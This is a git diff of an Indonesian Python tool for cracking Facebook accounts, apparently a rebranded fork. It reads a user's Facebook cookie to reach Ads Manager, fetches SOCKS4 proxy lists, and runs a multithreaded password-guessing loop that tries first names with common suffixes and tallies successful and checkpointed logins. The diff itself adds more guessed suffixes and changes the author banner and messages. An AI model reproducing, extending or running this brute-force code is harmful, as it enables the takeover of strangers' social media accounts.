@@ -40,7 +40,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mLuciverXploit')
+	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAryashule')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(1000):
    rr = random.randint; rc = random.choice
@@ -110,17 +110,17 @@ def ipin():
 
 def banner():
 	clear()
-	luciver_xp(f'''\x1b[1;92m █████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93m2024 Spesial\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mAuthor   \x1b[1;91m:  \x1b[1;96m Luciver Xploit  \x1b[1;97m               ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/LuciverXp\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/LuciverTrojans\x1b[\x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[•] Aku Adalah Luciver Xploit Yang Ganteng\n''')              
+	luciver_xp(f'''\x1b[1;92m █████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93m2024 Spesial\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mAuthor   \x1b[1;91m:  \x1b[1;96m Arya shule  \x1b[1;97m               ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/Aryashule4\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/arya phutra\x1b[\x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[•] SALAM DARI BIMA NUSA TENGGARA BARAT\n''')              
 
 def login():
 	os.system('clear')
 	banner()
 	cok = input(f'{p}Masukkan cookie :{h} ')
 	try:
-		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
+		head = {"User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}
 		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
 		find = re.findall('act=(.*?)&nav_source', link.text)
-		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);exit()
+		if len(find) == 0:print(f'> {m}masukan cookies sayang / ganti cookie lain !!!');time.sleep(2);exit()
 		else:
 			for x in find:
 				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
@@ -279,7 +279,7 @@ def setting():
 def passwrd():
 	os.system('clear')
 	banner()
-	print(f'\r {h}  ➢● {N}Bismillah Dulu Sayang')
+	print(f'\r {h}  ➢● {N} BERSABAR Sayang')
 	print(f' {N}    ┌─{h}● {h}OK/%s '%(okc))
 	print(f' {N}    └─{h}● {k}CP/%s '%(cpc))
 	with tred(max_workers=30) as pool:
@@ -292,6 +292,16 @@ def passwrd():
 					pass
 				else:
 					pwv.append(frs+'123')
+					pwv.append(frs+'a')
+					pwv.append(frs+'b')
+					pwv.append(frs+'c')
+					pwv.append(frs+'d')
+					pwv.append(frs+'e')
+					pwv.append(frs+'f')
+					pwv.append(frs+'g')
+					pwv.append(frs+'h')
+					pwv.append(frs+'i')
+					pwv.append(frs+'j')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
@@ -302,11 +312,23 @@ def passwrd():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
+					pwv.append(frs+'11')
+					pwv.append(frs+'12')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
 					pwv.append(frs+'321')
 					pwv.append(frs+'01')
+					pwv.append(frs+'a')
+					pwv.append(frs+'b')
+					pwv.append(frs+'c')
+					pwv.append(frs+'d')
+					pwv.append(frs+'e')
+					pwv.append(frs+'f')
+					pwv.append(frs+'g')
+					pwv.append(frs+'h')
+					pwv.append(frs+'i')
+					pwv.append(frs+'j')
 					pwv.append(frs+'02')
 					pwv.append(frs+'03')
 					pwv.append(frs+'04')
